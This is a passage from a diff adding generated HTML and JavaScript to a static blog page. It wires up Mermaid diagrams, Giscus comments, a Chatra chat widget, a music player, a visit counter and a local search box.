+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"mapping":"pathname","strict":0,"reactions_enabled":1,"emit_metadata":0,"input_position":"top","lang":"zh-CN"}
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'sereniusx/sereniusx.github.io',
+      'data-repo-id': 'R_kgDOQCvQvQ',
+      'data-category-id': 'DIC_kwDOQCvQvc4C1pNr',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="/js/post-meta.js"></script><script src="/js/bg-duotone.js"></script><script src="/js/post-meta.js"></script><script src="/js/heatmap.js"></script><script src="/js/hr-random.js"></script><script>(() => {
+  window.ChatraID = 'xYpW5Meo932eB55bm'
+  window.Chatra = window.Chatra || function() {
+    (window.Chatra.q = window.Chatra.q || []).push(arguments)
+  }
+
+  btf.getScript('https://call.chatra.io/chatra.js').then(() => {
+    const isChatBtn = true
+    const isChatHideShow = true
+
+    if (isChatBtn) {
+      const close = () => {
+        Chatra('minimizeWidget')
+        Chatra('hide')
+      }
+
+      const open = () => {
+        Chatra('openChat', true)
+        Chatra('show')
+      }
+
+      window.ChatraSetup = { startHidden: true }
+    
+      window.chatBtnFn = () => document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()
+
+      document.getElementById('chat-btn').style.display = 'block'
+    } else if (isChatHideShow) {
+      window.chatBtn = {
+        hide: () => Chatra('hide'),
+        show: () => Chatra('show')
+      }
+    }
+  })
+})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
